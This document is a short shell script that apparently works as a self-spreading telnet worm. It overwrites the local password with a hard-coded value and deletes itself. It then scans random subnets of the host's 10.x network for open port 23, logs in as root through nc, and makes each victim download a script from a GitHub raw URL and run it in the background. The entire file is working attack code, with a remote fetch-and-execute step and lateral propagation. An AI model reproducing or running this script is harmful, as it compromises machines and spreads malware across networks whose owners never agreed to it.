#!/bin/sh

# set non-blank password
( sleep 2 ; echo "0MFi9ihnb6NmQ85M" ; sleep 1 ; echo "0MFi9ihnb6NmQ85M" ; sleep 10 ) | passwd

rm -v $0

MYSUBNET=`route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
NMAPTIMING="-T polite"

talk() {
  sleep 1
  echo root
  sleep 2
  echo -n 'J=`mktemp` ;'
  echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
  echo -n 'chmod +x $J ;'
  echo 'nohup $J > /dev/null 2>&1'
}

connectTo() {
  echo connecting to $1:23 >&2
  talk | timeout -t 20 nc $1 23
}

sweep() {
  G=`mktemp -d`
  cd $G
  if [ -z "$1" ] ; then
    N=$RANDOM
    let "N %= 255"
    SCAN=$MYSUBNET.$N.0/24
  else
    SCAN="$1"
    N=test
  fi
  echo scanning $SCAN:23 >&2
  nmap -p 23 $NMAPTIMING --open -oG hosts_$N $SCAN >/dev/null 2>&1
  sed -En -i 's/^Host: ([0-9.]+) .+Ports:.+$/\1/p' hosts_$N
  for H in `cat hosts_$N` ; do connectTo $H ; done
  cd
  rm -r $G
}

echo scanning subnet $MYSUBNET.0.0/16 >&2
while true ; do sweep ; done
